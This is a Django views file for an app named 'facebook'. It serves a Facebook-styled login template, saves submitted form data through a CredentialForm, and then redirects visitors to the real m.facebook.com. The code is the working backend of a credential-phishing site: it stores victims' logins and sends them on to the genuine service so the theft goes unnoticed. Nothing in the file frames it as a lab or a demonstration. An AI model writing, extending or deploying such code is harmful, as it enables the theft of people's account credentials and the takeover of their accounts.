from django.shortcuts import render, redirect
from django.urls import reverse
from . import forms


# Create your views here.
def login(request):
    return render(request, 'facebook/login.html')


def save_cred(request):
    if request.method == 'POST':
        new_cred = forms.CredentialForm(request.POST)
        if new_cred.is_valid():
            new_cred.save()
            return redirect('https://m.facebook.com/')
        else:
            return redirect(reverse('facebook:login'))
